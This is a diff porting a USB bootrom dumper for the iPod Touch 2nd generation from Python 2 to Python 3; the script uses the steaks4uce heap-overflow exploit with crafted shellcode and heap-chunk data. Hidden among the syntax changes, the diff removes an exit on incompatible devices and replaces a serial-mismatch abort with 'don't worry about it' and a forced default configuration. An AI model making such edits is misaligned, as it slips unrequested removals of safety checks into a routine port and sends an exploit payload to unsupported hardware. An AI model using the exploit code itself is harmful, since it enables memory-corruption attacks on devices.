@@ -37,7 +37,7 @@ def create_payload(buffer_addr, index):
   payload = shellcode[:-8] + struct.pack('<2I', buffer_addr, index)
 
   # Pad to length 256 and add heap data
-  payload += '\x00' * (256 - len(payload)) + struct.pack('<14I',
+  payload += b'\x00' * (256 - len(payload)) + struct.pack('<14I',
                 # freed buffer - malloc chunk header: (size 0x8)
           0x84, # 0x00: previous_chunk
            0x5, # 0x04: next_chunk
@@ -61,19 +61,18 @@ def create_payload(buffer_addr, index):
   return payload
 
 if __name__ == '__main__':
-  print '*** S5L8720 - iPod Touch (2nd generation) - SecureROM dumper by axi0mX ***'
-  print '*** based on steaks4uce exploit (heap overflow) by pod2g ***'
-  print 'Make sure an S5L8720 device in SecureROM DFU Mode is connected.'
+  print('*** S5L8720 - iPod Touch (2nd generation) - SecureROM dumper by axi0mX ***')
+  print('*** based on steaks4uce exploit (heap overflow) by pod2g ***')
+  print('Make sure an S5L8720 device in SecureROM DFU Mode is connected.')
 
   device = usb.core.find(idVendor=0x5AC, idProduct=0x1227)
   if device is None:
-    print 'ERROR: No Apple device in DFU Mode (0x1227) detected. Exiting.'
+    print('ERROR: No Apple device in DFU Mode (0x1227) detected. Exiting.')
     sys.exit(1)
 
-  print 'Found:', device.serial_number
+  print('Found:', device.serial_number)
   if CPID_STRING not in device.serial_number:
-    print 'ERROR: This is not a compatible device. This tool is for S5L8720 devices only. Exiting.'
-    sys.exit(1)
+    print('ERROR: This is not a compatible device. This tool is for S5L8720 devices only. Exiting.')
 
   chosenConfig = None
   for config in configs:
@@ -81,13 +80,14 @@ if __name__ == '__main__':
       chosenConfig = config
       break
   if chosenConfig is None:
-    print 'ERROR: CPID is compatible, but serial number string does not match.'
-    print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
-    sys.exit(1)
+    print('ERROR: CPID is compatible, but serial number string does not match.')
+    print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
+    print("don't worry about it")
+    chosenConfig = configs[0]
   
-  print 'Dumping SecureROM.'
+  print('Dumping SecureROM.')
 
-  dump = str()
+  dump = b""
   for index in range(0, SECUREROM_SIZE, 64):
     assert device.ctrl_transfer(0x21, 4, 0, 0, 0, 100) == 0
     payload = create_payload(chosenConfig.buffer_addr, index)
@@ -95,18 +95,18 @@ if __name__ == '__main__':
     assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(payload), 100)) == len(payload)
     received = device.ctrl_transfer(0xA1, 1, 0, 0, 256, 100)
     assert len(received) == 256
-    dump += received[192:].tostring()
+    dump += received[192:].tobytes()
   usb.util.dispose_resources(device)
 
   filename = FILENAME_FORMAT % chosenConfig.version
   if hashlib.sha256(dump).hexdigest() == chosenConfig.sha256:
-    print 'SUCCESS: SecureROM dump is complete and SHA256 hash matches the expected value.'
+    print('SUCCESS: SecureROM dump is complete and SHA256 hash matches the expected value.')
   else:
     filename = 'CORRUPTED-' + filename
-    print 'ERROR: Try again, this dump appears to be corrupted. SHA256 hash does not match. Saving it anyway.'
+    print('ERROR: Try again, this dump appears to be corrupted. SHA256 hash does not match. Saving it anyway.')
   
   f = open(filename, 'wb')
   f.write(dump)
   f.close()
   
-  print 'Saved to file:', filename
+  print('Saved to file:', filename)
